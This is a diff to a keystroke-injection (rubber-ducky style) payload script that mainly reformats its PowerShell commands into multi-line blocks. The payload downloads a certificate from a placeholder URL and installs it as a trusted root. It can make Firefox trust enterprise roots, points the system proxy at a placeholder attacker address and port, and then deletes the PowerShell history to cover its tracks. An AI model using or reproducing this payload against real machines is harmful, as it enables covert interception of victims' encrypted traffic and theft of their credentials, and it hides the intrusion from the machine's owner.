@@ -88,11 +88,34 @@ GUI x
 DELAY #SHORT_DELAY
 STRING i
 DELAY #MEDIUM_DELAY
-STRING Clear-Host; $c = New-TemporaryFile; try { Invoke-WebRequest -UseBasicParsing -Uri "#CERT_URL" -OutFile $c; Import-Certificate -FilePath $c -CertStoreLocation "Cert:\CurrentUser\Root"; 
+STRING_POWERSHELL
+    Clear-Host; 
+    $c = New-TemporaryFile; 
+    try { 
+        Invoke-WebRequest -UseBasicParsing -Uri "#CERT_URL" -OutFile $c; 
+        Import-Certificate -FilePath $c -CertStoreLocation "Cert:\CurrentUser\Root"; 
+END_STRING
 IF ( #CONFIGURE_FIREFOX == TRUE ) THEN
-    STRING if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") { Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "prefs.js" -Recurse | ForEach-Object { (Get-Content $_.FullName) -replace '"security.enterprise_roots.enabled", false', '"security.enterprise_roots.enabled", true' | Set-Content $_.FullName } }; 
+    STRING_POWERSHELL
+            if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") { 
+                Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "prefs.js" -Recurse | ForEach-Object { 
+                    (Get-Content $_.FullName) -replace '"security.enterprise_roots.enabled", false','"security.enterprise_roots.enabled", true' | Set-Content $_.FullName 
+                } 
+            }; 
+    END_STRING
 END_IF
-STRINGLN @{"ProxyServer" = "#PROXY_IP:#PROXY_PORT"; "ProxyEnable" = "1"}.GetEnumerator() | ForEach-Object { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name $_.Name -Value $_.Value }} finally { Remove-Item $c; Remove-Item (Get-PSreadlineOption).HistorySavePath; exit }
+STRING_POWERSHELL
+        @{ "ProxyServer" = "#PROXY_IP:#PROXY_PORT"; "ProxyEnable" = "1" }.GetEnumerator() | ForEach-Object { 
+            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name $_.Name -Value $_.Value 
+        } 
+    } 
+    finally { 
+        Remove-Item $c; 
+        Remove-Item (Get-PSReadLineOption).HistorySavePath; 
+        exit 
+    }
+END_STRING
+ENTER
 DELAY #LONG_DELAY
 ALT TAB
 DELAY #SHORT_DELAY
